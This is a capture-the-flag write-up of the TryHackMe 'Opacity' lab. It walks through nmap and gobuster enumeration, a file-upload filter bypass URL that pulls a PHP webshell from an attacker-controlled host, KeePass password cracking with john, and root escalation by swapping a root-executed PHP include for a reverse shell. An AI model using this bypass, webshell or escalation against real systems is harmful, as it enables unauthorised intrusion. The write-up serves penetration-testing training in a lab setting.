---
title: "Opacity"
date: 2025-02-14
image: /assets/img/tryhackme/Opacity/Opacity_image.jpg
description: Writeup of the TryHackMe-CTF Opacity
categories: [Tryhackme, Easy]
tags: [linux, web, php, fileupload, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Plattform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Opacity</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Opacity is a Boot2Root made for pentesters and cybersecurity enthusiasts.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/opacity">https://tryhackme.com/room/opacity</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Opacity.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.42.149                       
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-14 06:23 EST
  Nmap scan report for 10.10.42.149
  Host is up (0.043s latency).
  Not shown: 65531 closed tcp ports (conn-refused)
  PORT    STATE SERVICE
  22/tcp  open  ssh
  80/tcp  open  http
  139/tcp open  netbios-ssn
  445/tcp open  microsoft-ds

  Nmap done: 1 IP address (1 host up) scanned in 35.25 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80,139,445 10.10.42.149
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-14 06:24 EST
  Nmap scan report for 10.10.42.149
  Host is up (0.039s latency).

  PORT    STATE SERVICE     VERSION
  22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 (RSA)
  |   256 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e (ECDSA)
  |_  256 ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b (ED25519)
  80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
  | http-cookie-flags: 
  |   /: 
  |     PHPSESSID: 
  |_      httponly flag not set
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  | http-title: Login
  |_Requested resource was login.php
  139/tcp open  netbios-ssn Samba smbd 4.6.2
  445/tcp open  netbios-ssn Samba smbd 4.6.2
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Host script results:
  | smb2-time: 
  |   date: 2025-02-14T11:24:26
  |_  start_date: N/A
  |_clock-skew: -6s
  |_nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
```
From here I proceeded the analysis port by port.

## Port 445 Analysis

I analyzed the service with enum4linux, but didn't found any leads to proceed with.

## Port 80 Analysis

The webserver had a login page:

![Webserver Login](/assets/img/tryhackme/Opacity/thm_opacity_1.jpg)

Lacking information about potential credential combinations, I proceeded with a directory enumeration:
```bash
$ gobuster dir --url http://10.10.42.149/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.42.149/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /css                  (Status: 301) [Size: 310] [--> http://10.10.42.149/css/]
  /cloud                (Status: 301) [Size: 312] [--> http://10.10.42.149/cloud/]
```

### /cloud Analysis

Navigating to `/cloud` revealed an upload dialog:

![Webserver Upload](/assets/img/tryhackme/Opacity/thm_opacity_2.jpg)

Above the input field, a small text read `External Link`. I started an HTTP server using Python and provided the URL for a test image. The image was displayed on the webpage, and the direct link was revealed. I continued trying to upload a webshell. After testing several input filter bypasses I was able to upload a php shell with the following bypass:
```html
http://[attackerip]/shell.php#test.jpg
```

![Webserver Uploaded Webshell](/assets/img/tryhackme/Opacity/thm_opacity_3.jpg)

```bash
$ whoami      
  www-data
$ cd /home
$ ls
  sysadmin
$ cd sysadmin
$ ls
  local.txt
  scripts
$ cat local.txt
  cat: local.txt: Permission denied
```

## Port ### Analysis

## Privilege Escalation sysadmin

I searched for files which belonging to `sysadmin` which revealed an interesting file:
```bash
www-data@opacity:/home/sysadmin$ find / -user sysadmin -type f 2>/dev/null
/opt/dataset.kdbx
```

After downloading the file I used `john` for cracking the password:

```bash
$ keepass2john dataset.kdbx > hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
  [removed]        (dataset)     
  Session completed.
```

With the password I was able to open the Keepass file and found the password for user `sysadmin`. 

![Keepass](/assets/img/tryhackme/Opacity/thm_opacity_4.jpg)

I successfully connected using `ssh`:

```bash
sysadmin@opacity:~$ cat local.txt 
  [removed]
```

## Privilege Escalation root

The user `sysadmin` had a folder called `scripts` in his home directory. The permissions are interesting:
```bash
drwxr-xr-x 2 sysadmin root     4096 Feb 14 17:51 lib
-rw-r----- 1 root     sysadmin  519 Jul  8  2022 script.php
```

This allowed the sysadmin user to modify anything within the lib directory, while `script.php` was executed with root privileges. I searched for a connection inside of the `script.php` and found the following command:
```php
require_once('lib/backup.inc.php');
```

I renamed the `backup.inc.php` file and created a new one which was a php reverse shell. Shortly after, I received an incoming connection:

```bash
# whoami
	root
# cd /root
# ls
  proof.txt
  snap
# cat proof.txt
  [removed]
```

solved! :)
